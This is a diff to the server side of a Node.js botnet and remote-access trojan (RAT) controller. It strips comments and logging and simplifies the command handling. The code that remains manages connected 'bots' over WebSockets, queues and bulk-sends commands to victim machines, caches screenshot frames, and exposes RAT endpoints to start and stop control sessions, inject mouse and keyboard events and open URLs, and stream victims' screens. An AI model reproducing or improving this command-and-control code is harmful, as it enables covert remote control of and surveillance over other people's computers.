@@ -80,7 +80,6 @@ wss.on('connection', (ws, req) => {
 
                 // Gửi pending commands
                 const pendings = DB.pending_commands.filter(p => p.bot_id === botId);
-                console.log(`[WS] Sending ${pendings.length} pending commands to ${botId}`);
                 pendings.forEach(p => {
                     sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
                 });
@@ -108,9 +107,7 @@ wss.on('connection', (ws, req) => {
                     DB.commands[cmdIndex].result = data.result;
                     DB.commands[cmdIndex].status = data.status || 'ok';
                     DB.commands[cmdIndex].executed_at = Date.now();
-                    console.log(`[RESULT] ✅ Updated command ${data.cmd_id}`);
                 } else {
-                    // Fallback: tạo mới nếu không tìm thấy
                     DB.commands.push({
                         bot_id: botId,
                         cmd_id: data.cmd_id,
@@ -121,7 +118,6 @@ wss.on('connection', (ws, req) => {
                         issued_at: Date.now(),
                         executed_at: Date.now()
                     });
-                    console.log(`[RESULT] ⚠️ Created new command entry for ${data.cmd_id}`);
                 }
             }
 
@@ -131,7 +127,6 @@ wss.on('connection', (ws, req) => {
                     frame: data.image,
                     timestamp: data.timestamp || Date.now()
                 });
-                // Giới hạn cache
                 if (streamCache.size > 100) {
                     const keys = streamCache.keys();
                     for (let i = 0; i < 50; i++) {
@@ -163,11 +158,10 @@ wss.on('connection', (ws, req) => {
 
 function sendCommand(ws, botId, cmdId, command, args = []) {
     if (ws && ws.readyState === WebSocket.OPEN) {
-        const payload = JSON.stringify({
+        ws.send(JSON.stringify({
             type: 'command',
             payload: { cmd_id: cmdId, command, args }
-        });
-        ws.send(payload);
+        }));
         console.log(`[CMD] 📤 Sent to ${botId}: ${command} (${cmdId})`);
         return true;
     } else {
@@ -180,17 +174,14 @@ function sendCommand(ws, botId, cmdId, command, args = []) {
 //  API
 // ============================================================
 
-// Lấy danh sách bot
 app.get('/api/bots', auth, (req, res) => {
     res.json(DB.bots);
 });
 
-// Lấy bot online
 app.get('/api/bots/online', auth, (req, res) => {
     res.json(DB.bots.filter(b => b.online === 1));
 });
 
-// Xóa bot
 app.delete('/api/bots/:bot_id', auth, (req, res) => {
     DB.bots = DB.bots.filter(b => b.bot_id !== req.params.bot_id);
     DB.commands = DB.commands.filter(c => c.bot_id !== req.params.bot_id);
@@ -198,7 +189,6 @@ app.delete('/api/bots/:bot_id', auth, (req, res) => {
     res.json({ status: 'deleted' });
 });
 
-// Gửi lệnh
 app.post('/api/command', auth, (req, res) => {
     const { bot_id, command, args = [] } = req.body;
     if (!bot_id || !command) {
@@ -207,8 +197,7 @@ app.post('/api/command', auth, (req, res) => {
 
     const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
     
-    // Lưu command vào DB
-    const cmdEntry = {
+    DB.commands.push({
         bot_id: bot_id,
         cmd_id: cmdId,
         command: command,
@@ -217,29 +206,13 @@ app.post('/api/command', auth, (req, res) => {
         status: 'pending',
         issued_at: Date.now(),
         executed_at: null
-    };
-    DB.commands.push(cmdEntry);
-    console.log(`[API] 📝 Command saved: ${cmdId} for ${bot_id}`);
+    });
 
-    // Tìm bot và gửi lệnh
     const ws = botClients.get(bot_id);
     if (ws && ws.readyState === WebSocket.OPEN) {
-        const sent = sendCommand(ws, bot_id, cmdId, command, args);
-        if (sent) {
-            res.json({ status: 'sent', cmd_id: cmdId });
-        } else {
-            // Fallback: queue
-            DB.pending_commands.push({
-                bot_id: bot_id,
-                cmd_id: cmdId,
-                command: command,
-                args: JSON.stringify(args),
-                issued_at: Date.now()
-            });
-            res.json({ status: 'queued', cmd_id: cmdId });
-        }
+        sendCommand(ws, bot_id, cmdId, command, args);
+        res.json({ status: 'sent', cmd_id: cmdId });
     } else {
-        // Bot offline -> queue
         DB.pending_commands.push({
             bot_id: bot_id,
             cmd_id: cmdId,
@@ -247,12 +220,10 @@ app.post('/api/command', auth, (req, res) => {
             args: JSON.stringify(args),
             issued_at: Date.now()
         });
-        console.log(`[API] ⚠️ Bot ${bot_id} offline, queued`);
         res.json({ status: 'queued', cmd_id: cmdId });
     }
 });
 
-// Gửi lệnh hàng loạt
 app.post('/api/command/bulk', auth, (req, res) => {
     const { bot_ids, command, args = [] } = req.body;
     if (!bot_ids || !Array.isArray(bot_ids) || bot_ids.length === 0) {
@@ -292,27 +263,16 @@ app.post('/api/command/bulk', auth, (req, res) => {
     res.json({ results });
 });
 
-// Lấy kết quả lệnh
 app.get('/api/results/:cmd_id', auth, (req, res) => {
     const cmd = DB.commands.find(c => c.cmd_id === req.params.cmd_id);
-    if (cmd) {
-        console.log(`[API] 📥 Result for ${req.params.cmd_id}: ${cmd.status}`);
-        res.json(cmd);
-    } else {
-        console.log(`[API] ⚠️ Command ${req.params.cmd_id} not found`);
-        res.json({});
-    }
+    res.json(cmd || {});
 });
 
-// Lấy kết quả cuối (cho RAT)
 app.get('/api/results/latest/:bot_id', auth, (req, res) => {
     const botId = req.params.bot_id;
-    console.log(`[API] Getting latest for ${botId}`);
     
-    // 1. Lấy từ stream cache
     const cached = streamCache.get(botId);
     if (cached && cached.frame) {
-        console.log(`[API] ✅ Returning cached frame for ${botId}`);
         return res.json({
             cmd_id: 'stream-latest',
             result: cached.frame,
@@ -321,21 +281,13 @@ app.get('/api/results/latest/:bot_id', auth, (req, res) => {
         });
     }
     
-    // 2. Fallback: lấy từ command sc gần nhất
     const cmds = DB.commands
         .filter(c => c.bot_id === botId && c.command === 'sc')
         .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0));
     
-    if (cmds.length > 0) {
-        console.log(`[API] ✅ Returning latest sc command for ${botId}`);
-        res.json(cmds[0]);
-    } else {
-        console.log(`[API] ⚠️ No data for ${botId}`);
-        res.json({});
-    }
+    res.json(cmds[0] || {});
 });
 
-// Lấy lịch sử
 app.get('/api/history/:bot_id', auth, (req, res) => {
     const history = DB.commands
         .filter(c => c.bot_id === req.params.bot_id)
@@ -344,12 +296,10 @@ app.get('/api/history/:bot_id', auth, (req, res) => {
     res.json(history);
 });
 
-// Lấy tất cả commands
 app.get('/api/commands', auth, (req, res) => {
     res.json(DB.commands);
 });
 
-// Lấy pending commands
 app.get('/api/pending', auth, (req, res) => {
     res.json(DB.pending_commands);
 });
@@ -358,7 +308,6 @@ app.get('/api/pending', auth, (req, res) => {
 //  RAT API
 // ============================================================
 
-// RAT START
 app.post('/api/rat/start', auth, (req, res) => {
     const { bot_id } = req.body;
     if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });
@@ -379,7 +328,6 @@ app.post('/api/rat/start', auth, (req, res) => {
     res.json({ status: 'rat_started', bot_id });
 });
 
-// RAT STOP
 app.post('/api/rat/stop', auth, (req, res) => {
     const { bot_id } = req.body;
     if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });
@@ -394,7 +342,6 @@ app.post('/api/rat/stop', auth, (req, res) => {
     res.json({ status: 'rat_stopped', bot_id });
 });
 
-// RAT EVENT
 app.post('/api/rat/event', auth, (req, res) => {
     const { bot_id, event_type, x, y, text, url } = req.body;
     if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });
@@ -424,7 +371,6 @@ app.post('/api/rat/event', auth, (req, res) => {
     res.json({ status: 'event_sent', cmd_id: cmdId });
 });
 
-// RAT STREAM
 app.get('/api/rat/stream/:bot_id', auth, (req, res) => {
     const botId = req.params.bot_id;
     const ws = botClients.get(botId);
